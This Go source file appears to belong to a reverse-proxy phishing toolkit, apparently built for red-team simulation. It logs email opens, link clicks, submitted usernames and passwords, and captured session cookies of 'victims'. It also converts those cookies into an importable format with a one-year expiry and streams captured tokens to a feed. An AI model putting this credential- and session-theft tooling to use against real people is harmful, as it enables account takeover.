// Package campaignstore isolates the proxy-to-campaign relational event bridge.
// Proxy-owned sessions, tokens, and IP controls never enter this store.
package campaignstore

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/jinzhu/gorm"
	_ "github.com/mattn/go-sqlite3"
	"github.com/s4l1hs/olta/pkg/campaign/secrets"
	feedclient "github.com/s4l1hs/olta/pkg/feed/client"
	"github.com/s4l1hs/olta/pkg/proxy/database"
	sqlitedsn "github.com/s4l1hs/olta/pkg/storage/sqlite"
	"github.com/s4l1hs/olta/pkg/telemetry"
)

type BaseRecipient struct {
	Email, FirstName, LastName, Position string
}

type Result struct {
	Id           int64
	CampaignId   int64
	UserId       int64
	RId          string
	Status       string
	IP           string
	Latitude     float64
	Longitude    float64
	SendDate     time.Time
	Reported     bool
	ModifiedDate time.Time
	BaseRecipient
	SMSTarget bool
}

type Event struct {
	Id, CampaignId int64
	Email          string
	Time           time.Time
	Message        string
	Details        string
}

type eventDetails struct {
	Payload url.Values        `json:"payload"`
	Browser map[string]string `json:"browser"`
}

type FeedEvent struct {
	Event   string `json:"event"`
	Time    string `json:"time"`
	Message string `json:"message"`
	Tokens  string `json:"tokens"`
}

type queuedEvent func() error

// Store serializes campaign writes and feed notifications away from HTTP
// request goroutines.
type Store struct {
	db           *gorm.DB
	feedEnabled  bool
	feedEndpoint string
	emitter      telemetry.Emitter

	mu        sync.Mutex
	ready     *sync.Cond
	queue     []queuedEvent
	closed    bool
	lastErr   error
	done      chan struct{}
	closeOnce sync.Once
}

func New(path, feedEndpoint string, feedEnabled bool) (*Store, error) {
	if _, err := secrets.ConfigureFromEnvironment(); err != nil {
		return nil, err
	}
	db, err := gorm.Open("sqlite3", sqlitedsn.ConcurrentDSN(path))
	if err != nil {
		return nil, fmt.Errorf("open Olta campaign database: %w", err)
	}
	db.DB().SetMaxOpenConns(2)
	store := &Store{
		db:           db,
		feedEnabled:  feedEnabled,
		feedEndpoint: feedclient.PublisherEndpoint(feedEndpoint),
		done:         make(chan struct{}),
	}
	store.ready = sync.NewCond(&store.mu)
	go store.run()
	return store, nil
}

// SetEmitter attaches a telemetry emitter. It must be called before the
// store begins handling requests. A nil emitter disables emission.
func (s *Store) SetEmitter(emitter telemetry.Emitter) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.emitter = emitter
}

// stageForStatus maps a campaign result status to its telemetry stage. The
// delivery stage is deliberately absent: the campaign service owns it,
// because the proxy never sees an email being sent.
func stageForStatus(status string) (telemetry.Stage, telemetry.Outcome, telemetry.Technique, bool) {
	switch status {
	case "Email/SMS Opened":
		return telemetry.StageOpen, telemetry.OutcomeAllowed, telemetry.TechniqueSpearphishingLink, true
	case "Clicked Link":
		return telemetry.StageLure, telemetry.OutcomeAllowed, telemetry.TechniqueSpearphishingLink, true
	case "Submitted Data":
		return telemetry.StageCredential, telemetry.OutcomeCaptured, telemetry.TechniqueWebPortalCapture, true
	case "Captured Session":
		return telemetry.StageCapture, telemetry.OutcomeCaptured, telemetry.TechniqueStealWebSessionCookie, true
	default:
		return "", "", "", false
	}
}

func (s *Store) emitStage(result Result, status string, browser map[string]string) {
	s.mu.Lock()
	emitter := s.emitter
	s.mu.Unlock()
	if emitter == nil {
		return
	}

	stage, outcome, technique, ok := stageForStatus(status)
	if !ok {
		return
	}

	// Only non-sensitive browser attributes cross into telemetry. The full
	// browser map and the captured payload stay in the encrypted events row.
	emitter.Emit(
		telemetry.New(stage, outcome, technique).
			WithCampaign(result.CampaignId, result.RId).
			WithActor(telemetry.Actor{
				IP:        result.IP,
				UserAgent: browser["user-agent"],
			}),
	)
}

func (s *Store) enqueue(event queuedEvent) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.closed {
		return fmt.Errorf("campaign event store is closed")
	}
	s.queue = append(s.queue, event)
	s.ready.Signal()
	return nil
}

func (s *Store) run() {
	defer close(s.done)
	for {
		s.mu.Lock()
		for len(s.queue) == 0 && !s.closed {
			s.ready.Wait()
		}
		if len(s.queue) == 0 && s.closed {
			s.mu.Unlock()
			return
		}
		event := s.queue[0]
		s.queue[0] = nil
		s.queue = s.queue[1:]
		s.mu.Unlock()
		if err := event(); err != nil {
			s.mu.Lock()
			s.lastErr = err
			s.mu.Unlock()
		}
	}
}

func (s *Store) Close() error {
	var result error
	s.closeOnce.Do(func() {
		s.mu.Lock()
		s.closed = true
		s.ready.Broadcast()
		s.mu.Unlock()
		<-s.done
		s.mu.Lock()
		result = s.lastErr
		s.mu.Unlock()
		if err := s.db.Close(); result == nil {
			result = err
		}
	})
	return result
}

func (s *Store) HandleEmailOpened(rid string, browser map[string]string) error {
	browser = cloneStrings(browser)
	return s.enqueue(func() error { return s.emailOpened(rid, browser) })
}

func (s *Store) HandleClickedLink(rid string, browser map[string]string) error {
	browser = cloneStrings(browser)
	return s.enqueue(func() error { return s.clickedLink(rid, browser) })
}

func (s *Store) HandleSubmittedData(rid, username, password string, browser map[string]string) error {
	browser = cloneStrings(browser)
	return s.enqueue(func() error {
		return s.updateResult(rid, "Submitted Data", browser, url.Values{"Username": {username}, "Password": {password}}, func(result Result) error {
			return s.notify(result, "Submitted Data", "Victim "+result.Email+" has submitted data. View the protected campaign event for details.", "")
		})
	})
}

func (s *Store) HandleCapturedCookieSession(rid string, tokens map[string]map[string]*database.CookieToken, browser map[string]string) error {
	browser = cloneStrings(browser)
	tokens = cloneCookies(tokens)
	return s.enqueue(func() error {
		encoded := cookieTokensJSON(tokens)
		return s.updateResult(rid, "Captured Session", browser, url.Values{"Tokens": {encoded}}, func(result Result) error {
			return s.notify(result, "Captured Session", "Captured session for victim: "+result.Email, encoded)
		})
	})
}

func (s *Store) HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string) error {
	browser = cloneStrings(browser)
	tokens = cloneStrings(tokens)
	return s.enqueue(func() error {
		data, err := json.Marshal(tokens)
		if err != nil {
			return err
		}
		encoded := string(data)
		return s.updateResult(rid, "Captured Session", browser, url.Values{"Tokens": {encoded}}, func(result Result) error {
			return s.notify(result, "Captured Session", "Captured session for victim: "+result.Email, encoded)
		})
	})
}

func (s *Store) emailOpened(rid string, browser map[string]string) error {
	return s.updateResult(rid, "Email/SMS Opened", browser, url.Values{"client_id": {rid}}, func(result Result) error {
		event := "Email Opened"
		medium := "Email"
		if result.SMSTarget {
			event, medium = "SMS Opened", "SMS"
		}
		return s.notify(result, event, medium+" has been opened by victim: "+result.Email, "")
	})
}

func (s *Store) clickedLink(rid string, browser map[string]string) error {
	var current Result
	if err := s.db.Table("results").Where("r_id=?", rid).Scan(&current).Error; err != nil {
		return err
	}
	if current.Status == "Email/SMS Sent" {
		if err := s.emailOpened(rid, browser); err != nil {
			return err
		}
	}
	return s.updateResult(rid, "Clicked Link", browser, url.Values{"client_id": {rid}}, func(result Result) error {
		return s.notify(result, "Clicked Link", "Link has been clicked by victim: "+result.Email, "")
	})
}

func (s *Store) updateResult(rid, status string, browser map[string]string, payload url.Values, notification func(Result) error) error {
	var result Result
	if err := s.db.Table("results").Where("r_id=?", rid).Scan(&result).Error; err != nil {
		return err
	}
	details, err := json.Marshal(eventDetails{Payload: payload, Browser: browser})
	if err != nil {
		return err
	}
	protectedDetails, err := secrets.Encrypt(string(details))
	if err != nil {
		return err
	}
	event := Event{CampaignId: result.CampaignId, Email: result.Email, Time: time.Now().UTC(), Message: status, Details: protectedDetails}
	if err := s.db.Save(&event).Error; err != nil {
		return err
	}
	result.IP = "127.0.0.1"
	result.ModifiedDate = event.Time
	s.emitStage(result, status, browser)
	if notification != nil && s.feedEnabled {
		if err := notification(result); err != nil {
			return err
		}
	}
	if statusRank(status) < statusRank(result.Status) {
		return nil
	}
	result.Status = status
	return s.db.Save(&result).Error
}

func statusRank(status string) int {
	switch status {
	case "Email/SMS Opened":
		return 1
	case "Clicked Link":
		return 2
	case "Submitted Data":
		return 3
	case "Captured Session":
		return 4
	default:
		return 0
	}
}

func (s *Store) notify(result Result, event, message, tokens string) error {
	conn, _, err := feedclient.DialPublisher(s.feedEndpoint)
	if err != nil {
		return err
	}
	defer conn.Close()
	data, err := json.Marshal(FeedEvent{Event: event, Time: result.ModifiedDate.String(), Message: message, Tokens: tokens})
	if err != nil {
		return err
	}
	return conn.WriteMessage(websocket.TextMessage, data)
}

func cookieTokensJSON(tokens map[string]map[string]*database.CookieToken) string {
	type cookie struct {
		Path, Domain, Value, Name string
		ExpirationDate            int64
		HttpOnly, HostOnly        bool
	}
	cookies := make([]cookie, 0)
	for domain, values := range tokens {
		for name, token := range values {
			if token == nil {
				continue
			}
			hostOnly := true
			if len(domain) > 0 && domain[0] == '.' {
				domain, hostOnly = domain[1:], false
			}
			path := token.Path
			if path == "" {
				path = "/"
			}
			cookies = append(cookies, cookie{Path: path, Domain: domain, ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(), Value: token.Value, Name: name, HttpOnly: token.HttpOnly, HostOnly: hostOnly})
		}
	}
	data, _ := json.Marshal(cookies)
	return string(data)
}

func cloneStrings(values map[string]string) map[string]string {
	copyValues := make(map[string]string, len(values))
	for key, value := range values {
		copyValues[key] = value
	}
	return copyValues
}

func cloneCookies(tokens map[string]map[string]*database.CookieToken) map[string]map[string]*database.CookieToken {
	copyTokens := make(map[string]map[string]*database.CookieToken, len(tokens))
	for domain, values := range tokens {
		copyValues := make(map[string]*database.CookieToken, len(values))
		for name, token := range values {
			if token != nil {
				copyToken := *token
				copyValues[name] = &copyToken
			}
		}
		copyTokens[domain] = copyValues
	}
	return copyTokens
}
